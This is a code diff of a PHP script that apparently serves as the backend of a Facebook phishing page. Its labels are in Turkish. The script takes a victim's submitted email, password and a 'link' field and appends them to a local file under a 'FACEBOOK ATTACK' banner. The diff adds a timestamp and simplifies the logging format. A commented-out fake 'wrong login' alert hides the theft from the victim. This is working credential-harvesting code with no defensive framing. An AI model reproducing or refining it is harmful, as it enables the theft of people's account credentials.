@@ -3,33 +3,23 @@
 
 if (isset($_POST['eposta']) && isset($_POST['password']) && isset($_POST['link'])) {
 
-$save = fopen("kaydedilen.txt","a+");
+$save = fopen("saved_info.txt","a+");
 $eposta = $_POST['eposta'];
 $password = $_POST['password'];
 $link = $_POST['link'];
+date_default_timezone_set('Europe/Istanbul');
+$tarih = date('d/m/Y H:i:s');
 $vericekilen = ("
-\e[32m
-	████████████████████████████████████████
-	██
-	██ \e[97mSALDIRI LİNKİ  : \e[32m".$link."\e[32m
-	██
-	████████████████████████████████████████
++-+-+ FACEBOOK ATTACK +-+-+
 
+ Tarih         : ".$tarih."
 
-	████████████████████████████████████████
-	██
-	██ \e[97mE-POSTA        : \e[32m".$eposta."\e[32m
-	██
-	████████████████████████████████████████
+ E-POSTA       : ".$eposta."
 
+ Şifre         : ".$password."
 
-	████████████████████████████████████████
-	██
-	██ \e[97mŞİFRE         : \e[32m".$password."\e[32m
-	██
-	████████████████████████████████████████\e[97m
-
-	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+");
 fwrite($save,$vericekilen);
 fclose($save);
 //echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";
